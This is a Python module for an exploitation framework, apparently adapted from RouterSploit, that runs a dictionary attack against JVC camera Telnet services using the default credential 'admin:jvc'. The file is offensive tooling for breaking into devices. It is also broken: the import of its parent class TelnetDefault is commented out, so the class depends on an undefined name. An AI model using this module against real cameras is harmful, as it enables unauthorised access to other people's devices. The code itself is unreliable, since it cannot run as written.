# Absorbed from RouterSploit — rewritten for EmbedXPL v5.0.0
# Original authors preserved in __info__["authors"]
# EmbedXPL adaptation: André Henrique (@mrhenrike) | União Geek

from embedxpl.core.exploit import *
# SKIPPED: # FIXED: from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "JVC Camera Default Telnet Creds",
        "description": "Module performs dictionary attack against JVC Camera Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "EmbedXPL absorption: André Henrique (@mrhenrike) | União Geek",
# SKIPPED:             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "JVC Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:jvc", "User:Pass or file with default credentials (file://)")
